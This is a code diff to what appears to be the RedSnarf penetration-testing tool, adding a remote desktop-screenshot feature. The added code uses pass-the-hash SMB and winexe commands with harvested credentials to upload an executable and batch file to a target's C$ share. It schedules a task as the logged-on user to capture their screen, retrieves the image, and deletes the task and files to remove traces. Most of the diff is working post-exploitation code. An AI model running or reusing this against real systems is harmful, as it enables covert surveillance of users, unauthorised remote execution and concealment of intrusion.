@@ -719,6 +719,65 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
+			if screenshot in yesanswers:
+				try:
+					print colored("[+]Attempting to Screenshot Desktop",'green')
+					
+					res = os.stat(path+host+"/logged_on_users.txt").st_size > 3
+			
+					if res==True:
+						try:
+							u = open(path+host+"/logged_on_users.txt").read().splitlines()
+							
+							for n in u:
+								if n:
+									if not "USERNAME" in n:
+										loggeduser=n.lstrip()
+										endofloggeduser=loggeduser.find(" ")
+										loggeduser=loggeduser[:endofloggeduser]
+										break
+
+						except IOError as e:
+							print "I/O error({0}): {1}".format(e.errno, e.strerror)
+					else:
+						print colored("[-]No logged on users found: "+host,'red')
+						exit(1)	
+
+					fout=open('/tmp/sshot.bat','w')
+					fout.write('SchTasks /Create /SC DAILY /RU '+loggeduser+' /TN "RedSnarf_ScreenShot" /TR "cmd.exe /c start /min c:\\rsc.exe c:\\'+host+'.png" /ST 23:36 /f\n')
+					fout.write('SchTasks /run /TN "RedSnarf_ScreenShot" \n')
+					fout.close() 
+					
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put rsc.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					print proc.communicate()[0]
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+host+".png"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					print proc.communicate()[0]
+					
+					if os.path.isfile(outputpath+host+"/"+host+".png"):
+						print colored("[+]Screenshot file saved as "+outputpath+host+"/"+host+".png",'yellow')
+					else:
+						print colored("[-]Screenshot not found, try again..",'red')
+
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\"+host+".png"+" c:\\rsc.exe c:\\sshot.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+
+					time.sleep(4)
+
+					fout=open('/tmp/sshot_del.bat','w')
+					fout.write('SchTasks /delete /TN "RedSnarf_ScreenShot" /f')
+					fout.close() 
+
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot_del.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot_del.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					print proc.communicate()[0]
+					
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\sshot_del.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					
+				except OSError:
+					print colored("[-]Something went wrong running screenshot...",'red')
+
 def signal_handler(signal, frame):
 		print colored("\nCtrl+C pressed.. aborting...",'red')
 		sys.exit()
@@ -1156,6 +1215,7 @@ p.add_argument("-eO", "--ofind_user", dest="ofind_user", default="n", help="<Opt
 p.add_argument("-eP", "--password_policy", dest="password_policy", default="n", help="<Optional> Display Password Policy")
 p.add_argument('--protocols', nargs='*', help=str(SAMRDump.KNOWN_PROTOCOLS.keys()))
 p.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default="n", help="<Optional> Display NT AUTHORITY\SYSTEM Tasklist")
+p.add_argument("-eS", "--screenshot", dest="screenshot", default="n", help="<Optional> Take a screenshot of remote machine desktop")
 # Registry related
 p.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
 p.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP Status")
@@ -1210,6 +1270,7 @@ edq_allowtgtsessionkey=args.edq_allowtgtsessionkey
 system_tasklist=args.system_tasklist
 multi_rdp=args.multi_rdp
 edq_SingleSessionPerUser=args.edq_SingleSessionPerUser
+screenshot=args.screenshot
 
 if lat in yesanswers:
 	WriteLAT()
